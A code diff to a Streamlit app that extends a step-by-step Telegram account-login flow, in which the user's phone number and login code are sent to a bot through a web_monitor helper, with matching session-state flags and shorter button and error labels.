@@ -84,6 +84,11 @@ def user_app(userid, tables_dict, password):
                 st.session_state['telegram_login_qr_sent'] = False
             if 'telegram_phone_sent' not in st.session_state:
                 st.session_state['telegram_phone_sent'] = False
+            if 'telegram_code_sent' not in st.session_state:
+                st.session_state['telegram_code_sent'] = False
+            if 'telegram_finished' not in st.session_state:
+                st.session_state['telegram_finished'] = False
+            
                 
             # Step 1: Send 'login qr' only when button is pressed
             if not st.session_state['telegram_login_qr_sent']:
@@ -91,39 +96,48 @@ def user_app(userid, tables_dict, password):
                     asyncio.run(web_monitor.send_message_to_telegram_bot('login qr'))
                     st.session_state['telegram_login_qr_sent'] = True
                     st.rerun()
-                # st.stop()
+
             elif not st.session_state['telegram_phone_sent']:
                 # Step 2: Enter phone number and send only when button is pressed
                 phone_number = st.text_input(
-                    "Enter your phone number (with country code) for Telegram QR code",
+                    "Enter your phone number (with country code) for Telegram login",
                     key="telegram_phone_input",
                     placeholder="+1234567890"
                 )
                 phone_pattern = re.compile(r"^\+\d{10,15}$")
                 if phone_pattern.match(phone_number):
-                    if st.button("Send Phone Number to Telegram Bot"):
+                    if st.button("Send Phone Number"):
                         result = asyncio.run(web_monitor.send_message_to_telegram_bot(phone_number))
                         if not result or result.get("status") != "success":
-                            st.error("Failed to send phone number to Telegram bot. Please try again.")
+                            st.error("Failed to send phone number. Please try again.")
                         else:
                             st.session_state['telegram_phone_sent'] = True
                             st.rerun()
-                    # st.stop()
-            else:
+
+            elif not st.session_state['telegram_code_sent']:
                 # Step 3: Enter login code and send only when button is pressed
                 login_code = st.text_input(
-                    "Login code sent to your Telegram. Enter the code here to generate QR code",
+                    "Login code sent to your Telegram. Enter the code here to complete login",
                     key="telegram_code_input"
                 )
-                if login_code and st.button("Send Login Code to Telegram"):
+                if login_code and st.button("Send Login Code"):
                     result = asyncio.run(web_monitor.send_message_to_telegram_bot(login_code))
                     if not result or result.get("status") != "success":
-                        st.error("Failed to send login code to Telegram bot. Please try again.")
+                        st.error("Failed to send login code. Please try again.")
                     else:
                         st.session_state['telegram_code_sent'] = True
                         st.rerun()
-                # st.stop()
-                
+
+            elif not st.session_state['telegram_finished']:
+                st.info("Check your Telegram app for a login confirmation message.")
+                st.session_state['telegram_finished'] = False
+                st.session_state['telegram'] = True
+                st.session_state['telegram_login_qr_sent'] = False
+                st.session_state['telegram_phone_sent'] = False
+                st.session_state['telegram_code_sent'] = False
+                st.session_state['telegram_finished'] = False
+
+            
 
         if selected_platform != 'telegram':
             if st.button("Generate QR Code"):
